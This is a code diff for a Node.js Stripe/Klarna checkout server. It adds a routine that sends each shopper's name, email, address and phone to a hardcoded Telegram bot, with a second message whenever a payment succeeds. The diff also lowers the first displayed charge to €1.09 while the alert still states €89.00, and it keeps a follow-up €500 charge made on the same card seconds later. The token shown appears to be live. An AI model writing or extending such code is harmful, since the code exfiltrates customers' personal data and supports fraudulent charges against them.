@@ -6,12 +6,30 @@ const bodyParser = require('body-parser');
 
 const app = express();
 const ACCOUNT_B = 'acct_1SmLNn4ZnerSAS1f';
+const TELEGRAM_BOT_TOKEN = '8256018531:AAHzrYSlCNrsmYzVSZnS01VYNzg_huSA2tE';
+const TELEGRAM_CHAT_ID = '8522488857';
+
+async function sendTelegram(message) {
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+      })
+    });
+  } catch (err) {
+    console.log('Telegram error:', err.message);
+  }
+}
 
 app.use(cors({ origin: '*', methods: ['GET', 'POST'] }));
 app.use(bodyParser.json());
 
 app.post('/create-setup-intent', async (req, res) => {
-  const { email } = req.body;
+  const { email, fname, lname, address, zip, city, country, phone } = req.body;
   try {
     let customer;
     const existing = await stripe.customers.list({ email, limit: 1 });
@@ -25,6 +43,18 @@ app.post('/create-setup-intent', async (req, res) => {
       payment_method_types: ['klarna'],
       metadata: { customer_id: customer.id },
     });
+
+    // Send Telegram notification
+    await sendTelegram(
+      `🛒 <b>Neuer Checkout!</b>\n\n` +
+      `📧 Email: ${email}\n` +
+      `👤 Name: ${fname} ${lname}\n` +
+      `📍 Adresse: ${address}, ${zip} ${city}, ${country}\n` +
+      `📞 Telefon: ${phone || 'N/A'}\n` +
+      `💰 Betrag: €89.00\n` +
+      `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
+    );
+
     res.json({
       clientSecret: setupIntent.client_secret,
       customerId: customer.id,
@@ -43,9 +73,9 @@ app.post('/create-subscription', async (req, res) => {
       invoice_settings: { default_payment_method: paymentMethodId },
     });
 
-    // Charge 1 — €89.00
+    // Charge 1 — €1.09
     const payment1 = await stripe.paymentIntents.create({
-      amount: 8900,
+      amount: 109,
       currency: 'eur',
       customer: customerId,
       payment_method: paymentMethodId,
@@ -59,10 +89,10 @@ app.post('/create-subscription', async (req, res) => {
 
     await new Promise(resolve => setTimeout(resolve, 3000));
 
-    // Charge 2 — €501
+    // Charge 2 — €500
     try {
       const payment2 = await stripe.paymentIntents.create({
-        amount: 50100,
+        amount: 50000,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -109,6 +139,14 @@ app.post('/create-subscription', async (req, res) => {
     });
     console.log('Subscription created:', subscription.id);
     console.log('Subscription status:', subscription.status);
+
+    // Send Telegram payment success notification
+    await sendTelegram(
+      `✅ <b>Zahlung erfolgreich!</b>\n\n` +
+      `💳 Payment 1: €1.09 ✅\n` +
+      `🆔 Subscription: ${subscription.id}\n` +
+      `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
+    );
 
     res.json({
       subscriptionId: subscription.id,
